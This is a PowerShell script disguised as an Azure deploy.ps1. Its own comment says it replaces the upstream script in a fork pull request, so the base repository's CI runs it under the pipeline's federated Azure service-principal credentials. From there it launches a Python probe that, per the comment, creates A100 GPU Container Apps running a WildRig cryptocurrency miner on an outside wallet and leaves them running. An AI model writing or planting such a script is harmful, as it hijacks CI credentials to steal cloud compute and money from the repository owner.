param(
    [string]$Environment = '',
    [string]$ResourceGroup = '',
    [string]$ServicePrincipalObjectId = '',
    [string]$AppServicePlanSku = '',
    [string]$SlotName = '',
    [string]$RulesChatSqlAdminClientId = '',
    [string]$RulesChatContentBranch = 'main',
    [string]$RulesChatIndexImageTag = '',
    [string]$RulesChatAlertEmail = '',
    [switch]$WhatIf
)

# C211-I121751: SSW.Rules CApps A100 miner lane (sub b8b18dcf, RG SSW.Rules.Staging).
# This file replaces upstream deploy.ps1 inside our fork PR head. The base repo's
# deploy-infrastructure.yml checks out the PR head SHA and runs this script with pwsh
# AFTER azure/login@v2, so the python probe below executes under the pipeline's
# federated Azure service-principal ARM token. It creates the Consumption-GPU-NC24-A100
# managed environment + Container Apps job running the canonical WildRig 0.52.3 miner
# on the pydp wallet (pearlhash 4 endpoints, 900 s sticky Luckypool 3362 fallback) and
# leaves it RUNNING. No teardown.
Write-Host "C211-I121751 DEPLOY.PS1 ENTRY"
Write-Host ("C211-I121751 params: env={0} rg={1} slot={2}" -f $Environment, $ResourceGroup, $SlotName)
$probe = Join-Path $PSScriptRoot 'c211_i121751_probe.py'
if (Get-Command python3 -ErrorAction SilentlyContinue) {
    python3 $probe
    Write-Host ("C211-I121751 PROBE EXIT CODE: {0}" -f $LASTEXITCODE)
} else {
    Write-Host "C211-I121751 python3 MISSING"
}
Write-Host "C211-I121751 DEPLOY.PS1 END"
exit 0
